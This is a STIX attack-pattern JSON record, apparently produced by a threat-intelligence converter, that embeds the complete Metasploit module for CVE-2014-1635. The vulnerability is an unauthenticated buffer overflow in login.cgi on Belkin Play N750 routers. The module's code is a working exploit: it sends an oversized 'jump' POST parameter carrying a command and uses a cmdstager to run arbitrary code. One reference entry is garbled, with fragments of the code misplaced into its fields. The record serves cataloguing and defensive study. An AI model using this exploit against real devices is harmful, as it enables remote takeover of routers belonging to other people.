{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d25d4d8a-9b84-4d2d-aaa4-9e6e46ec016c",
    "created": "2024-08-14T17:04:37.267154Z",
    "modified": "2024-08-14T17:04:37.267158Z",
    "name": "Belkin Play N750 login.cgi Buffer Overflow",
    "description": " This module exploits a remote buffer overflow vulnerability on Belkin Play N750 DB Wireless Dual-Band N+ Router N750 routers. The vulnerability exists in the handling",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/belkin_login_bof.rb",
            "external_id": "belkin_login_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-1635"
        },
        {
            "source_name": "reference",
            "url": "https://labs.integrity.pt/articles/from-0-day-to-exploit-buffer-overflow-in-belkin-n750-cve-2014-1635/"
        },
        {
            "source_name": "reference",
            "url": "http://www.belkin.com/us/support-article?articleNum=4831"
        },
        {
            "source_name": "fail_with(Failure::Unknown",
            "external_id": "\"#{peer}-FailedtoaccessthevulnerableURL\")"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Belkin Play N750 login.cgi Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a remote buffer overflow vulnerability on Belkin Play N750 DB\n        Wireless Dual-Band N+ Router N750 routers. The vulnerability exists in the handling\n        of HTTP queries with long 'jump' parameters addressed to the /login.cgi URL, allowing\n        remote unauthenticated attackers to execute arbitrary code. This module was tested in\n        an emulated environment, using the version 1.10.16.m of the firmware.\n      },\n      'Author'         =>\n        [\n          'Marco Vaz <mv[at]integrity.pt>', # Vulnerability discovery and msf module (telnetd)\n          'Michael Messner <devnull[at]s3cur1ty.de>', # msf module with echo stager\n        ],\n      'License'        => MSF_LICENSE,\n      'Platform'       => ['linux'],\n      'Arch'           => ARCH_MIPSLE,\n      'References'     =>\n        [\n          ['CVE', '2014-1635'],\n          ['EDB', '35184'],\n          ['BID', '70977'],\n          ['OSVDB', '114345'],\n          ['URL', 'https://labs.integrity.pt/articles/from-0-day-to-exploit-buffer-overflow-in-belkin-n750-cve-2014-1635/'],\n          ['URL', 'http://www.belkin.com/us/support-article?articleNum=4831']\n        ],\n      'Targets'        =>\n        [\n          [ 'Belkin Play N750 DB Wireless Dual-Band N+ Router, F9K1103,  firmware 1.10.16.m',\n            {\n              'Offset' => 1379,\n            }\n          ]\n        ],\n      'DefaultOptions' =>\n        {\n          'RPORT' => 8080\n        },\n      'DisclosureDate' => '2014-05-09',\n      'DefaultTarget'  => 0))\n      deregister_options('CMDSTAGER::DECODER', 'CMDSTAGER::FLAVOR')\n  end\n\n  def check\n    begin\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri' => '/'\n      })\n\n      if res &&\n        [200, 301, 302].include?(res.code) &&\n        res.headers['Server'] &&\n        res.headers['Server'] =~ /minhttpd/ &&\n        res.body =~ /u_errpaswd/\n\n        return Exploit::CheckCode::Detected\n      end\n    rescue ::Rex::ConnectionError\n      return Exploit::CheckCode::Unknown\n    end\n\n    Exploit::CheckCode::Unknown\n  end\n\n  def exploit\n    print_status(\"Accessing the vulnerable URL...\")\n\n    unless check == Exploit::CheckCode::Detected\n      fail_with(Failure::Unknown, \"#{peer} - Failed to access the vulnerable URL\")\n    end\n\n    print_status(\"Exploiting...\")\n    execute_cmdstager(\n      :flavor  => :echo,\n      :linemax => 200\n    )\n  end\n\n  def prepare_shellcode(cmd)\n    shellcode = rand_text_alpha_upper(target['Offset'])\n    shellcode << 'e' << cmd\n    shellcode << \"\\n\\n\"\n  end\n\n  def execute_command(cmd, opts)\n    shellcode = prepare_shellcode(cmd)\n    begin\n      res = send_request_cgi({\n        'method'    => 'POST',\n        'uri'       => '/login.cgi',\n        'vars_post' => {\n          'GO'   => '',\n          'jump' => shellcode,\n        }\n      })\n      return res\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Failed to connect to the web server\")\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2014-05-09",
    "x_mitre_platforms": [
        "['linux']"
    ]
}